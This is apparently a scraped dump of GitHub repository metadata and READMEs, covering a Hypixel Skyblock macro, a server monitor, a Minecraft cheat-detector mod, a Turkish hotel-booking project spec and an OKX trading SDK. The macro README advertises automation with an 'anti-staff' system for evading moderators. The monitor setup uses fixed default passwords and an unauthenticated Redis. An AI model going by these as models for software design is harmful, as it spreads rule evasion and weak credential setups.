### 🌱 Wart & Crops
Realistic scripts for automating hours of automatic farming with no downtime, working for a great number of various farm designs.

### 🎃 Pumpkin & Melon
Great option for both XP and money.

### 🌵 Cactus
One of the best options for money, consistently high prices.

### 🍫 Cocoa Bean
Also a good choice for money.

### 🍄 Mushroom
The best crop to farm for XP by far.

### 🌾 Sugarcane
Sugarcane is an okay middle ground between XP and money, but easy to get high scores in.

## ⚔️ Combat
Scripts to maximize your combat level, complete quests, and earn lots of money with both beginner and end-game gear.

### 👻 Ghost
One of the most profitable scripts ever, going up to ~45 mil an hour at the best gear, but it needs very expensive gear.

### 💀 Crypt / Rev Slayer
A fully AFK script that endlessly kills Ghouls with an incredibly smooth pathfinder & autowalker. Full failsafes, everything. Includes an option to automatically start/complete quests.

### 🏹 Zealot (Ranged)
A script that uses ranged weapons such as Juju & Precusor Eye to kill zealots at a much higher frequency than melee scripts.

### ⚔️ Zealot (Melee)
A basic (still incredibly smooth) melee script that runs around the dragons nest (or brusier areas) killing Zealots.

### 🧟 Graveyard
Amazing for fresh accounts, simply runs around killing zombies in the graveyard.

## 🌲 Foraging
Get to level 50 in Foraging in just a few days, no joke.

### 🏞️ Park Foraging
Select your foraging area and endlessly autowalk around breaking trees at high speed. Supports rod swapping, autosell, failsafe, everything.

### 🌳 Hub Foraging
Downgraded version of the Park Foraging script, but it's a good start and nice for new accounts.

### 🌴 2x2 Island Foraging
The classic 2x2 island foraging script. Low XP rates but you keep your privacy whilst in your private island.

## 🎣 Fishing
Both a vital skill as well as being a money maker at end-game gear.

### 🐟 Auto-Fishing
Automatic fishing for water, lava, worm, etc. Supports autokilling, auto-selling, anti-afk, etc.

### 🚣 Fishing w Auto-Travel
Whilst the previous script is incredibly powerful, this script allows you to configure autowalking for specific areas in Skyblock so you can fully AFK fishing with failsafes.

## 🛠️ Miscellaneous
Additional useful scripts outside of the large categories above.

### 🧹 Plot Cleaner
Fully AFK plot cleaner, which uses both walking and flying pathfinders to 100% clear each plot quickly for you.

### 👋 Visitors
Greatly increase your profit/hour by completing visitors in between rewarps.

### 🪨 Cobblestone
The first macro you'd use when starting out, earning < 1m/h but only takes 10 mins to setup.

### 🔮 Alchemy
A speedy script that can take you from level 0 → 50 in just a few hours.

### 🎺 Harp
A fully automatic harp script, with no need to set a click delay like other mods.

### 💤 Anti-AFK
With a failsafe, just AFK's in the spot. Useful for minions.

## 🎛️ Mini Scripts / QOL
Secondary scripts or features that are just for some help with a particular task.

### 🧚 Fairy Souls
Directs you to the nearest (undiscovered) fairy soul.

### 🍫 Cocoa Placer
Vertically places cocoa - useful for building cocoa farms.

## 🔑 Crucial Features
If we named every feature and setting we had, this page would be way too long. So here are the most commonly asked for features.

### 👮️ Hydra Anti-Staff
By far the most advanced anti-staff out there. A system created by us called Hydra with the most check detections, hyper-realistic responses, and instant alerts. Simply unmatched.

### 📈 Scripting Sessions
Taunahi has a spectacular unique feature: Sessions. For all scripting sessions, it will keep track of all statistics and events that happen, which you can look over in your dashboard to see total earnings, failsafes,
",The best hypixel skyblock macro with a lot of useful features,"farmhelper,minecraft,taunahi,taunahi-plus,farm-helper",2024-04-20T18:53:36Z,2024-04-20T18:53:05Z,2024-04-20T18:53:05Z,1,1,0,2,0,11,16,1,0,NOASSERTION,Java
Doge2077/lite-monitor,main,"<p align=""center"">
  <a href=""https://github.com/Doge2077/lite-monitor"">
    <img src=""lite-monitor-web\src\assets\logo\lite-monitor-nobg.png"" width=""450""></a>
</p>
<p align=""center""> 
  <a href=""https://git.io/typing-svg""><img src=""https://readme-typing-svg.demolab.com?font=Righteous&size=20&duration=3000&pause=1000&color=5CE1E6&center=true&vCenter=true&repeat=false&width=435&lines=Simple+Fast+Accurate+LowMemoryOccupying"" alt=""Typing SVG"" /></a>
</p>
<p align=""center"">
  <img src=""https://img.shields.io/badge/oshi-67E1E6?style=for-the-badge&logoColor=white"" alt="""" />
  <img src=""https://img.shields.io/badge/Spring_Boot-F2F4F9?style=for-the-badge&logo=spring-boot"" alt="""" />
  <img src=""https://img.shields.io/badge/vue-%2335495e.svg?style=for-the-badge&logo=vuedotjs&logoColor=%234FC08D"" alt="""" />
  <img src=""https://img.shields.io/badge/mysql-4479A1.svg?style=for-the-badge&logo=mysql&logoColor=white"" alt="""" />
  <img src=""https://img.shields.io/badge/InfluxDB-22ADF6?style=for-the-badge&logo=InfluxDB&logoColor=white"" alt="""" />
  <img src=""https://img.shields.io/badge/redis-%23DD0031.svg?style=for-the-badge&logo=redis&logoColor=white"" alt="""" />
  <img src=""https://img.shields.io/badge/Rabbitmq-FF6600?style=for-the-badge&logo=rabbitmq&logoColor=white"" alt="""" />
  <img src=""https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white"" alt="""" />
</p>

****

<p align=""center"">
  简体中文
  ｜
  <a href=""https://github.com/Doge2077/lite-monitor/blob/main/en/README.md"">English</a>
</p>

## 关于 Lite-monitor

****

这是一个快速、准确、轻量化的服务器监控系统，拥有秒级的监控粒度，支持历史数据查看便于拥有多平台服务器的用户集中管理：

![](https://image.itbaima.cn/images/40/image-20240422179520537.png)

支持一键 SSH 到目标主机，便于快速操作：

![](https://lys2021.com/wp-content/uploads/2024/04/image-20240422189124020.png)

支持多用户管理不同主机：

![](https://image.itbaima.cn/images/40/image-20240422177570347.png)

****

## 服务端部署

****

### 环境依赖

****

- JDK17
- SpringBoot3
- Vue3
- MySQL 5.7+
- Redis
- InfluxDB
- RabbitMQ

****

### 手动部署

****

部署 MySQL：

- 设置用户 `root`，密码 `monitormysqlroot`
- 创建数据库 `lite-monitor-db`，字符集设置为 `utf8mb4`
- 执行导入 SQL 脚本，文件为 [`lite-monitor-db.sql`](https://github.com/Doge2077/lite-monitor/blob/main/lite-monitor-db.sql)

部署 InfluxDB：

- 访问主机的 `8086` 端口进入 InfluxDB 的控制台
- 设置用户为 `admin`，密码 `monitorinfluxdbadmin`
- 创建新的 Bucket，名称为：`lite-monitor`，推荐设置过期时间为 7 天

部署 RabbitMQ：

- 添加用户 `admin`，密码 `monitorrabbitmqadmin`，虚拟主机 `/`

部署 Redis：

- 无需设置密码验证

部署后端：

- 拉取本项目仓库到本地，对 `lite-monitor-server` 执行 `maven` 构建
- 如果数据库等配置不与本例相同，请注意修改 `application-prod.yml` 中的配置
- 使用 `maven` 打包，注意勾选 `prod` 环境配置并跳过测试
- 将打包好的后端 `jar` 上传到管理监控的主机执行，主机需要 `Java17` 运行环境，默认监听 `8010` 端口

部署前端：

- 配置 [`main.js`](https://github.com/Doge2077/lite-monitor/blob/main/lite-monitor-web/src/main.js) 的 `axios.defaults.baseURL` 中的主机 `ip`
- 配置 [`Terminal.vue`](https://github.com/Doge2077/lite-monitor/blob/main/lite-monitor-web/src/component/Terminal.vue) 的 `ws` 地址为主机 `ip`
- 本地执行 `npm` 构建，将打包后的前端文件上传到主机

部署 Nginx：

- 根据实际需要进行配置

默认登录用户为 `admin`，密码默认为 `123456`，可在【安全】管理界面修改邮箱和密码

****

### Docker 部署

****

拉取本项目仓库到本地

修改前端路由：

- 配置 [`main.js`](https://github.com/Doge2077/lite-monitor/blob/main/lite-monitor-web/src/main.js) 的 `axios.defaults.baseURL` 中的主机 `ip`
- 配置 [`Terminal.vue`](https://github.com/Doge2077/lite-monitor/blob/main/lite-monitor-web/src/component/Terminal.vue) 的 `ws` 地址为主机 `ip`

执行 [`docker-compose.yml`](https://github.com/Doge2077/lite-monitor/blob/main/docker-compose.yml) 到目标服务器

初始化  MySQL：

- 执行导入 SQL 脚本，文件为  [`lite-monitor-db.sql`](https://github.com/Doge2077/lite-monitor/blob/main/lite-monitor-db.sql)

初始化 InfluxDB:

- 访问主机的 `8086` 端口进入 InfluxDB 的控制台
- 设置用户为 `admin`，密码 `monitorinfluxdbadmin`
- 创建新的 Bucket，名称为：`lite-monitor`，推荐设置过期时间为 7 天

默认登录用户为 `admin`，密码默认为 `123456`，可在【安全】管理界面修改邮箱和密码

****

## 客户端部署

****

### 环境依赖

****

- JDK17
- SpringBoot3

****

### 手动部署

****

- 拉取本项目仓库到本地，对 `lite-monitor-client` 执行 `maven` 构建
- 使用 `maven` 打包，注意勾选 `prod` 环境配置并跳过测试
- 将打包好的后端 `jar` 上传到需要被监控的主机执行，主机需要 `Java17` 运行环境
- 首次运行会在当前目录创建 `config-local` 目录，并要求注册到服务端，输入服务端主机 `ip:port` 和服务端生成的 `token` 即可
- 支持将客户端以 `systemd` 方式注册为服务，具体配置可参考其他资料

****
","This is a fast, accurate, lightweight server monitoring system with second-level monitoring granularity, supporting historical data view for multi-platform server users, enable SSH to the target host  and multi-user management of different hosts.",,2024-04-04T06:48:08Z,2024-07-09T07:43:34Z,,0,2,0,57,0,2,15,1,0,MPL-2.0,Java
Krishna18062005/100-days-Challenge,main,,,,2024-04-24T22:17:59Z,2024-09-23T09:03:35Z,,0,2,1,122,0,2,15,1,0,,Java
Krishna18062005/Problem-Solving-Day-01-20,main,,,,2024-04-23T12:49:51Z,2024-06-11T23:53:16Z,,0,1,0,36,0,2,15,1,0,,Java
a8anassis/cf6-java,main,# cf6-java,,,2024-04-07T11:18:17Z,2024-07-30T16:35:21Z,,0,1,0,150,0,2,15,1,0,,Java
Nova-Committee/CheatDetector,master,"<div align=""center"">
  <img width=""300"" src=""https://github.com/Nova-Committee/CheatDetector/blob/master/logo.png?raw=true"" alt=""logo"">

# CheatDetector
<p align=""center"">
    <a href=""https://github.com/Nova-Committee/CheatDetector/issues"">
      <img src=""https://img.shields.io/github/issues/Nova-Committee/CheatDetector?style=flat"" alt=""issues"" />
    </a>
    <img src=""https://img.shields.io/badge/license-GPLV3-green"" alt=""License"">
    <a href=""https://github.com/Nova-Committee/CheatDetector/actions/workflows/gradle.yml"">
      <img src=""https://github.com/Nova-Committee/CheatDetector/actions/workflows/gradle.yml/badge.svg"" alt=""Action"">
    </a>  
</p>

[![Github Release Downloads](https://img.shields.io/github/downloads/Nova-Committee/CheatDetector/total?label=Github%20Release%20Downloads&style=flat-square)](https://github.com/Nova-Committee/CheatDetector/releases)
[![CurseForge Downloads](http://cf.way2muchnoise.eu/997222.svg?badge_style=flat)](https://www.curseforge.com/minecraft/mc-mods/cheatdetector)
[![Modrinth Downloads](https://img.shields.io/modrinth/dt/QNVaUzHT?label=Modrinth%20Downloads&logo=Modrinth%20Downloads&style=flat-square)](https://modrinth.com/mod/cheatdetector)

一个纯客户端模组，检测一些常见的作弊行为。

### ***“误判是不可避免的，反作弊判定结果仅供参考。”***
</div>

## 反作弊
反作弊 旨在不被发现的情况下揭示其他玩家的作弊行为。
- **Fly** 飞行检查
- **BoatFly** 船飞检查
- **HighJump** 高跳检查
- **Blink** 闪现检查
- **NoSlow** 无减速检查
- **Speed** 速度检查
- **Motion** 惯性检查
- **GameMode** 游戏模式检查
- **Velocity** 反击退检查
- **GroundSpoof** 假地面检查
- **AutoClicker** 连点器检查
- **Reach** 距离检查
- **HitBox** 命中框检查

## 修复
修复 旨在避免被生电服务器反作弊错误标记。
- 针对Themis反作弊
    - 右键连点器修复
- 针对GrimAC反作弊
    - 无效偏航角修复
- 针对Vulcan反作弊
    - BadPacket (Type 1)
    - BadPacket (Type 2)
- ServerFreeze 服务器冻结修复
    - 在服务器冻结时提醒你，并主动避免反作弊误判

## 模块
模块 旨在在生存中提供一些消解无趣的办法。
- **AntiVanish** 反隐身
    - 找出使用vanish插件隐身的人。
- **FlagDetector** 标记检测器
    - 基于拉回帮助你确认自己是否被服务器反作弊标记。
- **Spin** 自旋
    - 使你像大陀螺一样旋转。
- **AntiFall** 防摔落
    - 防止你意外摔下。
- **NoteBot** 音乐机器人
    - 在游戏里演奏.nbs乐曲。

## 可调选项
CheatDetector Mod使用**Mod Menu**和**Cloth Config API**实现配置页面。<sup>[Release 1.1.5.1](https://github.com/Nova-Committee/CheatDetector/releases/tag/1.1.5.1)及以前<sup>

从[Release 2.0.0](https://github.com/Nova-Committee/CheatDetector/releases/tag/1.1.5.1)开始，Mod使用**Magiclib**实现配置页面。

Mod包含200+项自定义选项，对于不同服务器，你可能需要根据延迟、丢包等情况修改配置。

默认设置为<80ms的服务器设计。

## 兼容性
在服务器使用是安全的，服务器无法通过你的发包了解到此Mod的安装情况。

对于玩法类模组的兼容性较弱。如果在模组服使用，~~可能~~很可能出现大量误判。

## 如何使用
- 根据你的游戏版本，选择Mod版本。
- 安装mod到客户端。 **（Fabric）**
- 启动游戏，通过**模组菜单**调整设置。

## 贡献
欢迎提issue或提交pull request。
如果你想和我共同开发这个项目，请联系我。

## 相关项目
- [TimeRecorder](https://github.com/Nova-Committee/TimeRecorder) （反作弊 模块在此mod基础上开发）
- [MagicLib](https://github.com/Hendrix-Shen/MagicLib) （ClickGUI）

<img src=""https://github.com/SAWARATSUKI/ServiceLogos/blob/main/Java/Java.png"" alt=""Java"" width=""100"" />
",一个纯客户端的作弊检测器,"anticheat,client-side,fabric-mod,fun,minecraft-mod,notebot",2024-04-03T02:31:37Z,2024-06-06T13:22:06Z,2024-05-31T11:09:51Z,41,2,9,122,7,1,15,2,1,NOASSERTION,Java
AbdllhKaya/TravelAgencySystem.java,master,"Turizm Acente Sistemi

Bu projenin temel amacı, otel sektöründe faaliyet gösteren işletmenin günlük operasyonlarını daha etkili bir şekilde yönetmesini sağlamak ve müşteri rezervasyon süreçlerini optimize etmektir. 

Patika Turizm Acentesi pek çok otel ile anlaşma yaparak otellerin odalarını müşterilere rezerve etmektedir. Acente tarafından admin yetkisine sahip ilk kişi yazılımcı tarafından veri tabanına kaydedilecektir. Admin yetkisine sahip kişi de sisteme login olup hem admin hem acente çalışanı ekleyebilecektir. Acente çalışanları sisteme otel, oda kaydedecek ve müşterilerin taleplerine göre oda araması yapıp rezervasyon işlemi yapacaktır. Müşterilerin sisteme erişimi olmadığını, telefon veya yüz yüze destek aldığı bir senaryo düşünün.

Otel Yönetim Sistemi, kullanıcı dostu bir arayüzle acente çalışanlarına esnek fiyatlandırma, detaylı otel ve oda yönetimi, rezervasyon kolaylığı ve otomatik hesaplama gibi özellikler sunarak bu amaçları gerçekleştirmeyi hedeflemektedir.

Uygulanacak projede iki farklı kullanıcı tanımlanacaktır. Bunlar admin ve acente çalışanıdır. Bu kullanıcıların yetkileri aşağıdaki gibidir:

Admin

Kullanıcı Yönetimi: Admin yetkisi ile giriş yapıldığında admin ekranı açılacak. Bu ekrandan
Username: 1
Password: 1
bilgileri ile giriş yaparak;
Acente çalışanı listeleme,
Ekleme, 
Silme, 
Güncelleme ve 
Kullanıcının rolüne (admin, personel) göre filtreleme yapılmalıdır.

Acente Çalışanı (Personel)

Username: 2
Password: 2
Bilgileri ile giriş yaparak;
Otel Yönetimi: Otel listeleme, ekleme
Oda Yönetimi: Oda listeleme, ekleme
Dönem Yönetimi: Dönem listeleme, ekleme
Fiyat Yönetimi
Oda Arama
Rezervasyon işlemleri: Rezervasyon listeleme, ekleme, silme, güncelleme

Kullanıcı Yönetimi

Kullanıcı yönetimi, admin tarafından sisteme erişecek kullanıcıları ekleme, çıkarma ve düzenleme işlemlerini gerçekleştirilir. Kullanıcılar username ve password girerek sisteme giriş yapar.

Admin, sisteme yeni bir kullanıcı eklerken kullanıcının rolünü (admin, personel) belirler.
Admin, mevcut kullanıcıların bilgilerini (ad, soyad, şifre vb.) düzenleyebilir.
Admin, kullanıcı hesabını silebilir.
Admin, kullanıcının rolüne (admin, personel) göre filtreleme yapabilir..


Otel Yönetimi

Acente anlaşmalı olduğu otelleri, konum bilgileri ve diğer özellikleri ile birlikte sistemden yönetmeli. Otel eklenirken Otel Adı, Adres, E-posta, Telefon, Yıldız, Tesis Özellikleri, Pansiyon tipleri gibi diğer tanımlamalar yapılır.

Otel ekranı, otellerin listelendiği bir ekranı içerir. Bu ekran üzerinden otel ekleme işlemi gerçekleştirilebilir. Aynı zamanda var olan otellere sahip olduğu pansiyon tipi, tesis özelliği ve dönem bilgisi kaydedilmelidir.


Sistemde olması beklenen Pansiyon Tipleri:

Ultra Her şey Dahil
Her şey Dahil
Oda Kahvaltı
Tam Pansiyon
Yarım Pansiyon
Sadece Yatak
Alkol Hariç Full credit


Sistemde olması beklenen Tesis Özellikleri:

Ücretsiz Otopark
Ücretsiz WiFi
Yüzme Havuzu
Fitness Center
Hotel Concierge
SPA
7/24 Oda Servisi


Örnek Otel Verisi;

Otel Adı: Kodluyoruz Life İstanbul
Şehir: İstanbul
Bölge: Beyoğlu
Tam Adres: Şahkulu, Şişhane Metro Durağı, Meşrutiyet Cd. No:125, 34421
E-posta: info@kodluyoruzorg
Telefon: 0212 xxx xx xx
Yıldız: 5 Yıldızlı
Tesis Özellikleri

Ücretsiz Otopark
SPA
7/24 Oda Servisi
Pansiyon Tipleri
Oda Kahvaltı
Yarım Pansiyon


Dönem Yönetimi

Otellere ait tarihsel dönemler eklenir ve oda fiyatlandırmalarında bu dönemler dikkate alınır. Buradaki amaç değişken bir fiyatlandırma sunabilmektir. Yaz aylarında otel fiyatları daha yüksek iken, bu durum kış ayları için daha azdır. Fiyatlandırmalar turizm sektöründe dönemsel olarak yapılır. Dönemler iki tarih aralığı olarak tanımlanır.

Dönemleri tarih aralığı olarak acente personeli girer. Oda fiyatlandırmaları bu dönemlere göre değişim gösterir.

Örnek Dönemler:

01/01/2021 - 31/05/2021
01/06/2021 - 01/12/2021


Oda Yönetimi

Acente çalışanı otellerden rezerv ettiği odaları sisteme ekler ve bu odalar üzerinden fiyatlandırma sağlar. Otellerin sahip olduğu oda tipleri tek kişilik oda (Single room), çift kişilik oda (Double room), junior suite oda, suite oda olacak şekilde 4 tip ile kısıtlı olacaktır. Aynı tipteki odaları sisteme tekrar tekrar eklemek yerine stok mantığı kullanılmaktadır. Ayrıca odalara ait özelliklerde girilmelidir. Oda özellik bilgileri aşağıda anlatılmaktadır.Oda ekranı, tüm odaların listelendiği bir ekranı içerir. Acente personeli, bu ekran üzerinden otellere oda eklemesi ve rezervasyon için oda arama işlemleri yapabilir. Oda ekleme sayfasına gidildiğinde ise otel, 4 tane oda tipinden bir tanesi, otele ait sisteme kayıtlı pansiyon tipinden bir tanesi ve otele ait sisteme kayıtlı dönemlerden bir tanesi seçilir. Yapılan seçimlere göre odanın yetişkin için gecelik fiyat bilgisi, çocuk için gecelik fiyat bilgisi ve stok adedi girilir. Ayrıca aşağıdaki oda özelliklerinden yatak sayısı, metrekare bilgisi, ve diğer oda özelliklerinden odada olup olmama bilgisi sisteme kaydedilmelidir. Oda listeleme ekranında odaya ait tüm bilgiler gösterilmelidir.Sistemde olması beklenen Oda Özellikleri :

Yatak Sayısı
Metrekare
Televizyon (Var, Yok)
Minibar (Var ,Yok)
Oyun Konsolu (Var, Yok)
Kasa (Var, Yok)
Projeksiyon (Var, Yok)
Bir odanın kapasitesi yatak sayısına bağlıdır. 2 yataklı bir odaya 2 misafir eklenebilir.


Oda Fiyatlandırmaları

Odalar gecelik fiyat olarak hesaplanır. Oda fiyatları otel için eklenmiş olan dönemlere, pansiyon tiplerine göre farklı olacaktır. Yetişkin ve çocuk için olmak üzere farklı fiyat tanımlanacaktır.

Oda Arama ve Rezervasyon İşlemleri

Acente çalışanı sistem üzerinden

Girdiği tarih aralığına,
Şehire,
Otel adına
göre oda arayabilmelidir.

Yukarıda verilen 3 arama ölçütünden sadece birinin girilmesi, sadece ikisinin girilmesi veya üçünün de girilmesi durumlarında arama yapılabilmelidir. Bunun için gerekli dinamik sql sorgusu yazmalısınız.


Oda Arama Algoritması

Acente gerekli oda arama bilgileri girdikten sonra, sistemde tanımlı olan odaları listeleyebilir.

Odaların listede çıkması için:

Odaya ait otelin istenilen şehir içinde olmalıdır.
İstenilen tarih aralığına göre otelin dönem bilgisi olmalıdır. Örneğin: giriş tarihi: 09/06/2021, çıkış tarihi: 12/06/2021 olan bir arama için, otellerin o tarih aralığında bir dönemleri olmalıdır.
Eğer otele ait dönem var ise, odanın da ilgili dönemlerde pansiyon tiplerine göre fiyat bilgisi olmalıdır ki müşteriye fiyat bilgisi verilebilsin.
Odanın stok sayısı 0'dan büyük olmalı.


Örnek Arama Verisi

Şehir: İstanbul
Giriş Tarihi: 01/04/2021
Çıkış Tarihi: 03/04/2021
Misafir Bilgisi: 2 Yetişkin, 1 Çocuk


Fiyat Hesaplama

Fiyatlar misafir bilgisi, kalınacak gece sayısı ve oda fiyatı üzerinden hesaplanır.

Bu bilgilere göre

İlk önce girilen şehirdeki oteller bulunur.
Bulunan otele ait stoğu olan odalar bulunur.
Odaların ilgili tarih aralığında dönem fiyat bilgisi var ise fiyat hesaplaması yapılır.

Fiyat hesaplaması otelin dönemine, pansiyon tipine, yetişkin ve çocuk sayısına, ve kalınacak geceye göre hesaplanır. 

Örneğin yaz dönemi yarım pansiyon için gecelik yetişkin ücreti 1500₺ olan bir otel odasında iki kişi üç gece konaklayacak ise ücret 9000₺ olarak hesaplanmalıdır.

Fiyat hesabını girilen bilgilere göre sistem otomatik hesaplamalıdır.


Rezervasyon İşlemi

Acente kullanıcısı istenilen özelliklere sahip odaları listeledikten sonra müşterinin istediği oda için rezervasyon işlemine geçer. Rezervasyon işlemine geçildiğinde toplam fiyat otomatik hesaplanmalı ve müşterilerden birinin iletişim bilgileri alınıp rezervasyon tamamlanır. 

Rezervasyon tamamlamak için:

Müşteri iletişim bilgileri
Misafir Ad, Soyad ve T.C. Kimlik Bilgileri
girerek sistem üzerinden satışı tamamlar. Eğer satış tamamlanırsa ilgili odanın stoğu 1 azalmış olur.

Acente çalışanları sistem üzerinde yapılan rezervasyonları listeleyebilecek, güncelleyebilecek ve silebilecektir. Silinen rezervasyonlarda ilgili odanın stoğu 1 arttırılmalıdır.

Kullanılan Teknolojiler

Java,
Java Swing (GUI),
PostgreSQL

",,,2024-04-23T19:08:11Z,2024-04-23T20:49:35Z,,0,2,0,5,0,0,15,1,0,,Java
Krishna18062005/Problem-Solving-Day-21-40,main,,,,2024-04-23T15:04:08Z,2024-06-13T06:34:53Z,,0,1,0,22,0,2,15,1,0,,Java
forestwanglin/okx-v5-java,main,"# okx-v5-java
[![GitHub version](https://img.shields.io/static/v1?label=version&message=v0.5.2024072701&color=blue)](https://github.com/forestwanglin/okx-v5-java)
[![License](https://img.shields.io/static/v1?label=license&message=MIT&color=orange)](https://github.com/forestwanglin/okx-v5-java/blob/main/LICENSE)

OKX v5 SDK for JAVA. 

I am going to implement all APIs on the [official api document](https://www.okx.com/docs-v5/en/#overview).

## SDK API STATUS
- ### Rest API
  - [Trading Account](https://www.okx.com/docs-v5/en/#trading-account-rest-api)
    - [x] [Get Balance](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-balance)
    - [ ] [Get positions](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions)
    - [ ] [Get positions history](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions-history)
    - [ ] [Get account and position risk](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-and-position-risk)
    - [ ] [Get bills details (last 7 days)](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-7-days)
    - [ ] [Get bills details (last 3 months)](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-3-months)
    - [ ] [Get account configuration](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-configuration)
    - [ ] [Set position mode](https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-position-mode)
    - [ ] [Set leverage](https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-leverage)
    - [ ] [Get maximum buy/sell amount or open amount](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-maximum-buy-sell-amount-or-open-amount)
    - [ ] ...
  - [Order Book Trading](https://www.okx.com/docs-v5/en/#order-book-trading)
    - [Trade](https://www.okx.com/docs-v5/en/#order-book-trading-trade)
      - [x] [POST / Place order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-order)
      - [ ] [POST / Place multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-multiple-orders)
      - [x] [POST / Cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-order)
      - [ ] [POST / Cancel multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-multiple-orders)
      - [ ] [POST / Amend order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-order)
      - [ ] [POST / Amend multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-multiple-orders)
      - [ ] [POST / Close positions](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-close-positions)
      - [ ] ...
    - [Grid Trading](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading)
      - [x] [POST / Place grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-place-grid-algo-order)
      - [x] [POST / Amend grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-amend-grid-algo-order)
      - [x] [POST / Stop grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-stop-grid-algo-order)
      - [x] [POST / Close position for contract grid](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-close-position-for-contract-grid)
      - [x] [POST / Cancel close position order for contract grid](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-cancel-close-position-order-for-contract-grid)
      - [x] [POST / Instant trigger grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-instant-trigger-grid-algo-order)
      - [x] [GET / Grid algo order list](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-list)
      - [x] [GET / Grid algo order history](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-history)
      - [x] [GET / Grid algo order details](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-details)
      - [x] [GET / Grid algo sub orders](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-sub-orders)
      - [x] [GET / Grid algo order positions](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-positions)
      - [x] [POST / Spot grid withdraw income](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-spot-grid-withdraw-income)
      - [x] [POST / Compute margin balance](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-margin-balance)
      - [x] [POST / Adjust margin balance](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-adjust-margin-balance)
      - [x] [POST / Add investment](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-add-investment)
      - [x] [GET / Grid AI parameter (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-ai-parameter-public)
      - [x] [POST / Compute min investment (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-min-investment-public)
      - [x] [GET / RSI back testing (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-rsi-back-testing-public)
- ### Websocket API
  - [Trading Account](https://www.okx.com/docs-v5/zh/#trading-account-websocket)
    - [x] [Account channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-account-channel)
    - [x] [Positions channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-positions-channel)
    - [x] [Balance and position channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-balance-and-position-channel)
    - [x] [Position risk warning](https://www.okx.com/docs-v5/en/#trading-account-websocket-position-risk-warning)
    - [x] [Account greeks channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-account-greeks-channel)
  - [Order Book Trading](https://www.okx.com/docs-v5/en/#order-book-trading)
    - [Trade](https://www.okx.com/docs-v5/en/#order-book-trading-trade)
      - [x] [WS / Order channel](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-order-channel)
      - [x] [WS / Place order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-order)
      - [x] [WS / Place multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-multiple-orders)
      - [x] [WS / Cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-order)
      - [x] [WS / Cancel multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-multiple-orders)
      - [x] [WS / Amend order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-order)
      - [x] [WS / Amend multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-multiple-orders)
      - [x] [WS / Mass cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-mass-cancel-order)
    - [Algo Trading](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading)
      - [x] [WS / Algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-algo-orders-channel)
      - [x] [WS / Advance algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-advance-algo-orders-channel)
    - [Grid Trading](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading)
      - [x] [WS / Spot grid algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-spot-grid-algo-orders-channel)
      - [x] [WS / Contract grid algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-contract-grid-algo-orders-channel)
      - [x] [WS / Grid positions channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-positions-channel)
      - [x] [WS / Grid sub orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-sub-orders-channel)
  - [Public Data](https://www.okx.com/docs-v5/en/#public-data-websocket)
    - [x] [Instruments channel](https://www.okx.com/docs-v5/en/#public-data-websocket-instruments-channel)
    - [x] [Open interest channel](https://www.okx.com/docs-v5/en/#public-data-websocket-open-interest-channel)
